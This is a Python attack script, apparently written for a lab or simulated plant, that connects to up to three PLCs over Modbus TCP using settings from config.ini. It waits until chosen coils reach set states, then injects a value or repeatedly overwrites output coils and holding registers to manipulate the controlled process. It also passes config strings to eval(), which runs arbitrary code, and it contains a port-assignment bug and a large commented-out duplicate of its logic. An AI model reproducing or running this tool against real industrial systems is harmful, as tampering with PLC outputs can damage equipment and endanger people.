import logging

from pymodbus.client import ModbusTcpClient
from time import sleep
import configparser
from threading import Thread

def attack (ctx):
	plc1 = ''
	plc2 = ''
	plc3 = ''
	plc1_address = ''
	plc2_address = ''
	plc3_address = ''
	port_plc1 = 0
	port_plc2 = 0
	port_plc3 = 0
	plc1_flag = 0
	plc2_flag = 0
	plc3_flag = 0
	
	coil1 = ''
	coil2 = ''
	coil3 = ''
	register1 = ''
	register2 = ''
	register3 = ''
	coil_value1_1 = ''
	coil_value1_2 = ''
	coil_value1_3 = ''
	register_value1_1 = ''
	register_value1_2 = ''
	register_value1_3 = ''
	trigger1 = ''
	trigger2 = ''
	trigger3 = ''
	pacchetto = ''
	
	coil1_2 = ''
	coil2_2 = ''
	coil3_2 = ''
	register1_2 = ''
	register2_2 = ''
	register3_2 = ''
	coil_value2_1 = ''
	coil_value2_2 = ''
	coil_value2_3 = ''
	register_value2_1 = ''
	register_value2_2 = ''
	register_value2_3 = ''
	trigger1_2 = ''
	trigger2_2 = ''
	trigger3_2 = ''
	pacchetto2 = ''
	
	coil1_3 = ''
	coil2_3 = ''
	coil3_3 = ''
	register1_3 = ''
	register2_3 = ''
	register3_3 = ''
	coil_value3_1 = ''
	coil_value3_2 = ''
	coil_value3_3 = ''
	register_value3_1 = ''
	register_value3_2 = ''
	register_value3_3 = ''
	trigger1_3 = ''
	trigger2_3 = ''
	trigger3_3 = ''
	pacchetto3 = ''
	
	config = configparser.ConfigParser()
	config.read('config.ini')
	print(config.sections())
	for key in config['plc']:
		print(key)
		print(config['plc'][key])
		if (key == 'plc1'):
			plc1 = config['plc'][key]
		if (key == 'plc2'):
			plc2 = config['plc'][key]
		if (key == 'plc3'):
			plc3 = config['plc'][key]
	print("L'indirizzo di plc1 è: ", plc1)
	print("L'indirizzo di plc2 è: ", plc2)
	print("L'indirizzo di plc3 è: ", plc3)
	
	#def attack_plc (address, port)
	
	if (plc1 != ''):
		plc1_address = plc1.split(':')[0]
		port_plc1 = plc1.split(':')[1]
		if (port_plc1 == '8083'):
			port_plc1 = 5023
		elif (port_plc1 == '8082'):
			port_plc1 = 5022
		elif (port_plc1 == '8081'):
			port_plc1 = 5021
		plc1_flag = 1
	
	if (plc2 != ''):
		plc2_address = plc2.split(':')[0]
		port_plc2 = plc2.split(':')[1]
		if (port_plc2 == '8083'):
			port_plc2 = 5023
		elif (port_plc2 == '8082'):
			port_plc2 = 5022
		elif (port_plc2 == '8081'):
			port_plc2 == 5021
		plc2_flag = 1
	
	if (plc3 != ''):
		plc3_address = plc3.split(':')[0]
		port_plc3 = plc3.split(':')[1]
		if (port_plc3 == '8083'):
			port_plc3 = 5023
		elif (port_plc3 == '8082'):
			port_plc3 = 5022
		elif (port_plc3 == '8081'):
			port_plc3 = 5021
		plc3_flag = 1
	
	print(port_plc1)
	print(port_plc2)
	print(port_plc3)
	"""if (plc1_flag):
		t_plc1 = Thread(target=attack_plc, args=(0, client, coil1))"""
	
	# prendo le scelte per plc n.1
	
	for key in config['coils1']:
		if (key == 'coil1'):
			coil1 = config['coils1'][key]
		if (key == 'coil2'):
			coil2 = config['coils1'][key]
		if (key == 'coil3'):
			coil3 = config['coils1'][key]
	
	for key in config['registers1']:
		if (key == 'register1'):
			register1 = config['registers1'][key]
		if (key == 'register2'):
			register2 = config['registers1'][key]
		if (key == 'register3'):
			register3 = config['registers1'][key]
			
	for key in config['triggers1']:
		if (key == 'trigger1'):
			trigger1 = config['triggers1'][key]
		if (key == 'trigger2'):
			trigger2 = config['triggers1'][key]
		if (key == 'trigger3'):
			trigger3 = config['triggers1'][key]
	
	for key in config['coil_value1']:
		if (key == 'value1'):
			coil_value1_1 = config['coil_value1'][key]
		if (key == 'value2'):
			coil_value1_2 = config['coil_value1'][key]
		if (key == 'value3'):
			coil_value1_3 = config['coil_value1'][key]
	
	for key in config['register_value1']:
		if (key == 'value1'):
			register_value1_1 = config['register_value1'][key]
		if (key == 'value2'):
			register_value1_2 = config['register_value1'][key]
		if (key == 'value3'):
			register_value1_3 = config['register_value1'][key]
	
	#coil_value = config['coil_value1']['value']
	#register_value = config['register_value1']['value']
			
	pacchetto = config['pacchetto1']['valore']
	target = config['pacchetto1']['target']
			
	coils_list = [coil1, coil2, coil3]
	registers_list = [register1, register2, register3]
	triggers_list = [trigger1, trigger2, trigger3]
	
	# prendo le scelte per plc n.2
	
	for key in config['coils2']:
		if (key == 'coil1'):
			coil1_2 = config['coils2'][key]
		if (key == 'coil2'):
			coil2_2 = config['coils2'][key]
		if (key == 'coil3'):
			coil3_2 = config['coils2'][key]
	
	for key in config['registers2']:
		if (key == 'register1'):
			register1_2 = config['registers2'][key]
		if (key == 'register2'):
			register2_2 = config['registers2'][key]
		if (key == 'register3'):
			register3_2 = config['registers2'][key]
			
	for key in config['triggers2']:
		if (key == 'trigger1'):
			trigger1_2 = config['triggers2'][key]
		if (key == 'trigger2'):
			trigger2_2 = config['triggers2'][key]
		if (key == 'trigger3'):
			trigger3_2 = config['triggers2'][key]
	
	for key in config['coil_value2']:
		if (key == 'value1'):
			coil_value2_1 = config['coil_value2'][key]
		if (key == 'value2'):
			coil_value2_2 = config['coil_value2'][key]
		if (key == 'value3'):
			coil_value2_3 = config['coil_value2'][key]
	
	for key in config['register_value2']:
		if (key == 'value1'):
			register_value2_1 = config['register_value2'][key]
		if (key == 'value2'):
			register_value2_2 = config['register_value2'][key]
		if (key == 'value3'):
			register_value2_3 = config['register_value2'][key]
	
	#coil_value2 = config['coil_value2']['value']
	#register_value2 = config['register_value2']['value']
			
	pacchetto2 = config['pacchetto2']['valore']
	target2 = config['pacchetto2']['target']
			
	coils_list2 = [coil1_2, coil2_2, coil3_2]
	registers_list2 = [register1_2, register2_2, register3_2]
	triggers_list2 = [trigger1_2, trigger2_2, trigger3_2]
	
	# prendo le scelte per plc n.3
	
	for key in config['coils3']:
		if (key == 'coil1'):
			coil1_3 = config['coils3'][key]
		if (key == 'coil2'):
			coil2_3 = config['coils3'][key]
		if (key == 'coil3'):
			coil3_3 = config['coils3'][key]
	
	for key in config['registers3']:
		if (key == 'register1'):
			register1_3 = config['registers3'][key]
		if (key == 'register2'):
			register2_3 = config['registers3'][key]
		if (key == 'register3'):
			register3_3 = config['registers3'][key]
			
	for key in config['triggers3']:
		if (key == 'trigger1'):
			trigger1_3 = config['triggers3'][key]
		if (key == 'trigger2'):
			trigger2_3 = config['triggers3'][key]
		if (key == 'trigger3'):
			trigger3_3 = config['triggers3'][key]
	
	for key in config['coil_value3']:
		if (key == 'value1'):
			coil_value3_1 = config['coil_value3'][key]
		if (key == 'value2'):
			coil_value3_2 = config['coil_value3'][key]
		if (key == 'value3'):
			coil_value3_3 = config['coil_value3'][key]
	
	for key in config['register_value3']:
		if (key == 'value1'):
			register_value3_1 = config['register_value3'][key]
		if (key == 'value2'):
			register_value3_2 = config['register_value3'][key]
		if (key == 'value3'):
			register_value3_3 = config['register_value3'][key]
			
	#coil_value3 = config['coil_value3']['value']
	#register_value3 = config['register_value3']['value']
			
	pacchetto3 = config['pacchetto3']['valore']
	target3 = config['pacchetto3']['target']
			
	coils_list3 = [coil1_3, coil2_3, coil3_3]
	registers_list3 = [register1_3, register2_3, register3_3]
	triggers_list3 = [trigger1_3, trigger2_3, trigger3_3]
	
	
	#coil_target = config['coil']['coil_target']
	"""for key in config['coil']:
		if (key == 'coil_target'):
			coil1 = config['params'][key]
		if (key == 'coil2'):
			coil2 = config['params'][key]
		if (key == 'coil3'):
			coil3 = config['params'][key]"""
	
	"""print("devo attaccare", coil_target)
	address = ""
	if (coil_target == 'coil1'):
		address = 0
	if (coil_target == 'coil2'):
		address = 1
	if (coil_target == 'coil3'):
		address = 2"""
		
	"""register_target = config['register']['register_target']
	address_register = 0
	if (register_target == 'low_1'):
		print("attacco a low_1")
		address_register = 1024
	if (register_target == 'high_1'):
		address_register = 1025
		print("attacco a high_1")"""
		
	
	def attack_plc (address, port, coils, registers, triggers, packet, target, client, coil_value1, coil_value2, coil_value3, register_value1, register_value2, register_value3):
		print("Thread plc partito")
		#client = ModbusTcpClient(address, port)
		#client.connect()
		#print("scrivo:", client.write_coil(0, False))
		#client.write_coil(0, True)
		
		def attack_coil(address, client, start, value):
			if (start == ''):
				return
			print("thread coil partito")
			#value = True
			for i in range (1, 100):
				client.write_coil(address, eval(value))
				sleep(1)
				#value = not value
	
		def attack_register(address, client, start, value):
			if (start == ''):
				return
			print("thread register partito")
			#value = 1
			for i in range(1, 100):
				client.write_register(address, int(value))
				sleep(1)
				#value += 1
		
		
		coil_trigger1 = 10
		coil_trigger2 = 10
		coil_trigger3 = 10
	
		value_trigger1 = ''
		value_trigger2 = ''
		value_trigger3 = ''
		
		trigger1 = triggers[0]
		trigger2 = triggers[1]
		trigger3 = triggers[2]
		
		coil1 = coils[0]
		coil2 = coils[1]
		coil3 = coils[2]
		
		register1 = registers[0]
		register2 = registers[1]
		register3 = registers[2]
	
		if (trigger1 != 'none'):
			coil_trigger1 = trigger1.split()[:1][0]
			print("ho preso la prima parte del trigger: ", coil_trigger1)
			if (coil_trigger1 == 'QX0.0'):
				coil_trigger1 = 0
			if (coil_trigger1 == 'QX0.1'):
				coil_trigger1 = 1
			if (coil_trigger1 == 'QX0.2'):
				coil_trigger1 = 2
			value_trigger1 = trigger1.split()[-1]
			if (value_trigger1 == 'ON'):
				value_trigger1 = True
			else: value_trigger1 = False
		if (trigger2 != 'none'):
			coil_trigger2 = trigger2.split()[:1][0]
			if (coil_trigger2 == 'QX0.0'):
				coil_trigger2 = 0
			if (coil_trigger2 == 'QX0.1'):
				coil_trigger2 = 1
			if (coil_trigger2 == 'QX0.2'):
				coil_trigger2 = 2
			value_trigger2 = trigger2.split()[-1]
			if (value_trigger2 == 'ON'):
				value_trigger2 = True
			else: value_trigger2 = False
		if (trigger3 != 'none'):
			coil_trigger3 = trigger3.split()[:1][0]
			if (coil_trigger3 == 'QX0.0'):
				coil_trigger3 = 0
			if (coil_trigger3 == 'QX0.1'):
				coil_trigger3 = 1
			if (coil_trigger3 == 'QX0.2'):
				coil_trigger3 = 2
			value_trigger3 = trigger3.split()[-1]
			if (value_trigger3 == 'ON'):
				value_trigger3 = True
			else: value_trigger3 = False
		
		
		print("trigger1: ", trigger1)
		print("trigger2: ", trigger2)
		print("trigger3: ", trigger3)
		
		if (trigger1 != 'none' or trigger2 != 'none' or trigger3 != 'none'):
			print("controllo i triggers")
			print(coil_trigger1, ":", value_trigger1)
			print(coil_trigger2, ":", value_trigger2)
			print(coil_trigger3, ".", value_trigger3)
			print("leggo: ", client.read_coils(coil_trigger1, 1).bits[0])
			print("leggo: ", client.read_coils(coil_trigger2, 1).bits[0])
			print("leggo: ", client.read_coils(coil_trigger3, 1).bits[0])
			"""while(client.read_coils(coil_trigger1, 1).bits[0] == value_trigger1 and client.read_coils(coil_trigger2, 1).bits[0] == value_trigger2 and client.read_coils(coil_trigger3, 1).bits[0] == value_trigger3):
			print('waiting for triggers...')
			sleep(1)"""
			check1 = True
			check2 = True
			check3 = True
			while(1):
				if (coil_trigger1 != 10):
					if (client.read_coils(coil_trigger1, 1).bits[0] != value_trigger1):
						check1 = False
					else: check1 = True
				if (coil_trigger2 != 10):
					if (client.read_coils(coil_trigger2, 1).bits[0] != value_trigger2):
						check2 = False
					else: check2 = True
				if (coil_trigger3 != 10):
					if (client.read_coils(coil_trigger3, 1).bits[0] != value_trigger3):
						check3 = False
					else: check3 = True
				print(check1)
				print(check2)
				print(check3)
				if (check1 == True and check2 == True and check3 == True):
					print("condizioni soddisfatte")
					break;
				else: print("waiting for triggers...")
				sleep(3)
		
	
		print("il pacchetto è: ", packet)
		if (packet != ''):
			if (target.startswith("Q")):
				if (target == "QX0.0"):
					target = 0
				if (target == "QX0.1"):
					target = 1
				if (target == "QX0.2"):
					target = 2
				client.write_coil(target, eval(packet))
			elif (target.startswith("M")):
				if (target == "MW0"):
					target = 1024
				if (target == "MW1"):
					target = 1025
				if (target == "MW2"):
					target = 1026
				client.write_register(target, int(packet))
		if (packet == ''):
			t_coil1 = Thread(target=attack_coil, args=(0, client, coil1, coil_value1))
			t_coil2 = Thread(target=attack_coil, args=(1, client, coil2, coil_value2))
			t_coil3 = Thread(target=attack_coil, args=(2, client, coil3, coil_value3))
	
			t_reg1 = Thread(target=attack_register, args=(1024, client, register1, register_value1))
			t_reg2 = Thread(target=attack_register, args=(1025, client, register2, register_value2))
			t_reg3 = Thread(target=attack_register, args=(1026, client, register3, register_value3))
		
			t_coil1.start()
			t_coil2.start()
			t_coil3.start()
		
			t_reg1.start()
			t_reg2.start()
			t_reg3.start()
		
			t_coil2.join()
			t_coil1.join()
			t_coil3.join()
	
			t_reg1.join()
			t_reg2.join()
			t_reg3.join()
		
		
		client.close()
		
	#PLC_IP = "127.0.0.1"
	PLC_IP = "0.0.0.0"
	porta_plc2 = 5021
	porta_plc3 = 5022
	porta_plc1 = 5023
	
	#client = ModbusTcpClient(PLC_IP, porta_plc1)
	#client2 = ModbusTcpClient(PLC_IP, porta_plc2)
	#client3 = ModbusTcpClient(PLC_IP, porta_plc3)
	
	client = ModbusTcpClient(plc1_address, port_plc1)
	client2 = ModbusTcpClient(plc2_address, port_plc2)
	client3 = ModbusTcpClient(plc3_address, port_plc3)

	logging.info("ADDRESS PLC1: " + plc1_address)
	logging.info("PORT PLC1: " + str(port_plc1))
	
	if (plc1_address != ''):
		client.connect()
	
	if (plc2_address != ''):
		#client2 = ModbusTcpClient(PLC_IP, porta_plc2)
		client2.connect()
	
	if (plc3_address != ''):
		#client3 = ModbusTcpClient(PLC_IP, porta_plc3)
		client3.connect()
	#client.write_coil(0, False)
	
	t_plc1 = Thread(target=attack_plc, args=(plc1_address, port_plc1, coils_list, registers_list, triggers_list, pacchetto, target, client, coil_value1_1, coil_value1_2, coil_value1_3, register_value1_1, register_value1_2, register_value1_3))
	t_plc2 = Thread(target=attack_plc, args=(plc2_address, port_plc2, coils_list2, registers_list2, triggers_list2, pacchetto2, target2, client2, coil_value2_1, coil_value2_2, coil_value2_3, register_value2_1, register_value2_2, register_value2_3))
	t_plc3 = Thread(target=attack_plc, args=(plc3_address, port_plc3, coils_list3, registers_list3, triggers_list3, pacchetto3, target3, client3, coil_value3_1, coil_value3_2, coil_value3_3, register_value3_1, register_value3_2, register_value3_3))
	
	if (plc1_address != ''):
		t_plc1.start()
	if (plc2_address != ''):
		t_plc2.start()
	if (plc3_address != ''):
		t_plc3.start()
	
	#t_plc1.start()
	#t_plc2.start()
	#t_plc3.start()
	
	if (plc1_address != ''):
		t_plc1.join()
	if (plc2_address != ''):
		t_plc2.join()
	if (plc3_address != ''):
		t_plc3.join()
		
	#t_plc1.join()
	#t_plc2.join()
	#t_plc3.join()
	
	# da qui in poi ho messo tutto nella funziona attack_plc
	
	"""client = ModbusTcpClient(PLC_IP, porta_plc1)
	client.connect()
		
	def attack_coil(address, client, start):
		if (start == ''):
			return
		print("thread coil partito")
		value = True
		for i in range (1, 100):
			client.write_coil(address, value)
			sleep(1)
			value = not value
	
	def attack_register(address, client, start):
		if (start == ''):
			return
		print("thread register partito")
		value = 1
		for i in range(1, 100):
			client.write_register(address, value)
			sleep(1)
			value += 1
		
	
	coil_trigger1 = 10
	coil_trigger2 = 10
	coil_trigger3 = 10
	
	value_trigger1 = ''
	value_trigger2 = ''
	value_trigger3 = ''
	
	if (trigger1 != 'none'):
		coil_trigger1 = trigger1.split()[:1][0]
		print("ho preso la prima parte del trigger: ", coil_trigger1)
		if (coil_trigger1 == 'QX0.0'):
			coil_trigger1 = 0
		if (coil_trigger1 == 'QX0.1'):
			coil_trigger1 = 1
		if (coil_trigger1 == 'QX0.2'):
			coil_trigger1 = 2
		value_trigger1 = trigger1.split()[-1]
		if (value_trigger1 == 'ON'):
			value_trigger1 = True
		else: value_trigger1 = False
	if (trigger2 != 'none'):
		coil_trigger2 = trigger2.split()[:1][0]
		if (coil_trigger2 == 'QX0.0'):
			coil_trigger2 = 0
		if (coil_trigger2 == 'QX0.1'):
			coil_trigger2 = 1
		if (coil_trigger2 == 'QX0.2'):
			coil_trigger2 = 2
		value_trigger2 = trigger2.split()[-1]
		if (value_trigger2 == 'ON'):
			value_trigger2 = True
		else: value_trigger2 = False
	if (trigger3 != 'none'):
		coil_trigger3 = trigger3.split()[:1][0]
		if (coil_trigger3 == 'QX0.0'):
			coil_trigger3 = 0
		if (coil_trigger3 == 'QX0.1'):
			coil_trigger3 = 1
		if (coil_trigger3 == 'QX0.2'):
			coil_trigger3 = 2
		value_trigger3 = trigger3.split()[-1]
		if (value_trigger3 == 'ON'):
			value_trigger3 = True
		else: value_trigger3 = False
		
		
	print("trigger1: ", trigger1)
	print("trigger2: ", trigger2)
	print("trigger3: ", trigger3)
	
	if (trigger1 != 'none' or trigger2 != 'none' or trigger3 != 'none'):
		print("controllo i triggers")
		print(coil_trigger1, ":", value_trigger1)
		print(coil_trigger2, ":", value_trigger2)
		print(coil_trigger3, ".", value_trigger3)
		print("leggo: ", client.read_coils(coil_trigger1, 1).bits[0])
		print("leggo: ", client.read_coils(coil_trigger2, 1).bits[0])
		print("leggo: ", client.read_coils(coil_trigger3, 1).bits[0])
		
		check1 = True
		check2 = True
		check3 = True
		while(1):
			if (coil_trigger1 != 10):
				if (client.read_coils(coil_trigger1, 1).bits[0] != value_trigger1):
					check1 = False
				else: check1 = True
			if (coil_trigger2 != 10):
				if (client.read_coils(coil_trigger2, 1).bits[0] != value_trigger2):
					check2 = False
				else: check2 = True
			if (coil_trigger3 != 10):
				if (client.read_coils(coil_trigger3, 1).bits[0] != value_trigger3):
					check3 = False
				else: check3 = True
			print(check1)
			print(check2)
			print(check3)
			if (check1 == True and check2 == True and check3 == True):
				print("condizioni soddisfatte")
				break;
			else: print("waiting for triggers...")
			sleep(3)
		
	
	print("il pacchetto è: ", pacchetto)
	if (pacchetto != ''):
		if (target.startswith("Q")):
			if (target == "QX0.0"):
				target = 0
			if (target == "QX0.1"):
				target = 1
			if (target == "QX0.2"):
				target = 2
			client.write_coil(target, eval(pacchetto))
		if (target.startswith("M")):
			if (target == "MW0"):
				target = 1024
			if (target == "MW1"):
				target = 1025
			if (target == "MW2"):
				target = 1026
			client.write_register(target, int(pacchetto))
	if (pacchetto == ''):
		t_coil1 = Thread(target=attack_coil, args=(0, client, coil1))
		t_coil2 = Thread(target=attack_coil, args=(1, client, coil2))
		t_coil3 = Thread(target=attack_coil, args=(2, client, coil3))
	
		t_reg1 = Thread(target=attack_register, args=(1024, client, register1))
		t_reg2 = Thread(target=attack_register, args=(1025, client, register2))
		t_reg3 = Thread(target=attack_register, args=(1026, client, register3))
	
		t_coil1.start()
		t_coil2.start()
		t_coil3.start()
	
		t_reg1.start()
		t_reg2.start()
		t_reg3.start()
	
		t_coil1.join()
		t_coil2.join()
		t_coil3.join()
	
		t_reg1.join()
		t_reg2.join()
		t_reg3.join()
	
	
	client.close()"""
